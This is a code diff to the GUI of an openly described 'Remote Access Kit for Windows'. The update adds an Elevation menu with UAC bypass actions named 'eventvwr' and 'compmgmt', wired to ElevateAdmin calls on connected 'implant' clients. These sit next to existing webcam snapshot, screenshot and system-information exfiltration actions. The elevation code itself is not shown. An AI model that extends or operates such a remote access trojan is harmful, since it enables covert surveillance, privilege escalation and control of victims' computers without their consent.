@@ -10,9 +10,8 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.22
+# Build:  1.0.23
 # -------------------------------------------------------------
-import os
 
 from PyQt5 import QtCore, QtGui, QtWidgets
 from PyQt5.Qt import Qt
@@ -39,7 +38,7 @@ from core.client_handling.networking import NetHandle
 from core.client_handling.enumeration import SystemCommands
 from core.client_handling.system import SystemManager
 from core.client_handling.surveillance import Streaming
-
+from core.client_handling.elevation import ElevateAdmin
 from time import sleep
 from os.path import exists
 
@@ -48,7 +47,7 @@ listening_ports_array = []
 active_connections_array = []
 listening_sockets_array = []
 
-BUILD_VERSION = '1.0.22'
+BUILD_VERSION = '1.0.23'
 
 class Ui_main_window(QWidget):
 
@@ -84,6 +83,9 @@ class Ui_main_window(QWidget):
         # ENUMERATION MENU
         # (none)
 
+        # ELEVATION MENU
+        self.elevation_menu = self.context_menu.addMenu('Elevation')
+        self.uac_menu = self.elevation_menu.addMenu('UAC')
         # SURVEILLANCE MENU
         self.desktop_menu = self.surveillance_menu.addMenu('Desktop')
         self.webcam_menu = self.surveillance_menu.addMenu('Webcam')
@@ -111,10 +113,14 @@ class Ui_main_window(QWidget):
         self.system_info = self.enumeration_menu.addAction('System Info')  # System Information exfiltration
         self.get_client_process = self.enumeration_menu.addAction('Task Manager')  # Task Manager
 
+        # ELEVATION MENU
+            # UAC MENU
+        self.uac_event_viewer = self.uac_menu.addAction('eventvwr')
+        self.uac_comp_mgmt = self.uac_menu.addAction('compmgmt')
         # SURVEILLANCE MENU
-        # DESKTOP MENU
+            # DESKTOP MENU
         self.screenshot = self.desktop_menu.addAction('Screenshot')  # Screenshot action
-        # WEBCAM MENU
+            # WEBCAM MENU
         self.snapshot = self.webcam_menu.addAction('Snapshot')
         """
         Assemble Icons for menus and action items
@@ -146,12 +152,19 @@ class Ui_main_window(QWidget):
         self.system_info.setIcon(IconObj().system_icon)  # Icon
         self.get_client_process.setIcon(IconObj().task_manager_icon)  # Icon
 
+        #ELEVATION MENU
+        self.elevation_menu.setIcon(IconObj().elevation_icon)
+            #UAC MENU
+        self.uac_menu.setIcon(IconObj().admin_icon)
+        self.uac_event_viewer.setIcon(IconObj().eventvwr_icon)
+        self.uac_comp_mgmt.setIcon(IconObj().comp_mgmt_icon)
+
         # SURVEILLANCE MENU
         self.surveillance_menu.setIcon(IconObj().surveillance_icon)  # IcoN
-        # DESKTOP MENU
+            # DESKTOP MENU
         self.desktop_menu.setIcon(IconObj().system_icon)
         self.screenshot.setIcon(IconObj().screenshot_icon)  # Icon
-        # WEBCAM MENU
+            # WEBCAM MENU
         self.webcam_menu.setIcon(IconObj().webcam_icon)
         self.snapshot.setIcon(IconObj().screenshot_icon)
 
@@ -313,8 +326,8 @@ class Ui_main_window(QWidget):
 
         if event.type() == QEvent.ContextMenu and source is self.active_connections_list and self.active_connections_list.currentRow() > -1:   #If event is left click and the source is the active connections list
             """
-                    Assign functions to actions 
-                    """
+            Assign functions to actions 
+            """
             action = self.context_menu.exec_(
                 self.mapToGlobal(event.globalPos()))  # Define the click action bool for the menu
 
@@ -392,14 +405,18 @@ class Ui_main_window(QWidget):
                         break                                           #Break the loop
                 self.open_client_compatible_window(Ui_task_manager_dialog,get_client_socket_obj(),get_key_from_row())   #Open the task manager window
 
-            if action == self.snapshot:
-                ConsoleWindow().log_to_console('Paging client for webcam')
-                if Streaming().get_client_snapshot(get_key_from_row(),get_client_socket_obj()) == True:
-                    self.open_new_window(Ui_image_data_window)
-                    #os.remove(DSFilePath().streaming_frame)
+            if action == self.snapshot:                                         #If the action if to receive a webcam snapshot
+                ConsoleWindow().log_to_console('Paging client for webcam')      #Log to console
+                if Streaming().get_client_snapshot(get_key_from_row(),get_client_socket_obj()) == True: #If the client has a webcam and the server received a phote
+                    self.open_new_window(Ui_image_data_window)                                          #Open a window with the photo
                 else:
-                    ConsoleWindow().log_to_console('Failed to receive snapshot from client. Camera likely does not exist.')
+                    ConsoleWindow().log_to_console('Failed to receive snapshot from client. Camera likely does not exist.') #Log negative output if there's no camera
+                    
+            if action == self.uac_event_viewer:                                         #If action is to elevate
+                ElevateAdmin().uac_eventvwr(get_client_socket_obj(),get_key_from_row()) #Elevate
 
+            if action == self.uac_comp_mgmt:
+                ElevateAdmin().uac_computer_mgmt(get_client_socket_obj(),get_key_from_row())
 
             return True
         return super().eventFilter(source, event)
@@ -409,7 +426,7 @@ class Ui_main_window(QWidget):
         Define UI parameters
         """
         main_window.setObjectName("main_window")
-        main_window.resize(1574, 784)                           #Change main window size
+        main_window.resize(1574, 784)                          #Change main window size
         main_window.setWindowIcon(IconObj().main_window_icon)  #Set main window icon
         main_window.setStyleSheet(f"background-image: url({BGPath().main_window_bg});")
         main_window.setMaximumSize(1574, 784)
@@ -449,7 +466,7 @@ class Ui_main_window(QWidget):
         self.active_connections_list.installEventFilter(self)
         #self.active_connections_list.setSelectionBehavior(QAbstractItemView.SelectRows)
         self.implant_callback_window = QtWidgets.QListWidget(self.centralwidget)
-        self.implant_callback_window.setGeometry(QtCore.QRect(787, 350, 787, 414))
+        self.implant_callback_window.setGeometry(QtCore.QRect(787, 350, 787, 411))
         self.implant_callback_window.setStyleSheet("")
         self.implant_callback_window.setObjectName("implant_callback_window")
         ##############################
@@ -512,7 +529,7 @@ class Ui_main_window(QWidget):
         #                END MENU BAR                           #
         #########################################################
         self.status_window = QtWidgets.QLabel(self.centralwidget)
-        self.status_window.setGeometry(QtCore.QRect(0, 349, 787, 414))
+        self.status_window.setGeometry(QtCore.QRect(0, 350, 787, 414))
         self.status_window.setStyleSheet(f"background-image: url({ImageObj().grey_box});")
         self.status_window.setObjectName("status_window")
         self.connections_label = QtWidgets.QLabel(self.centralwidget)
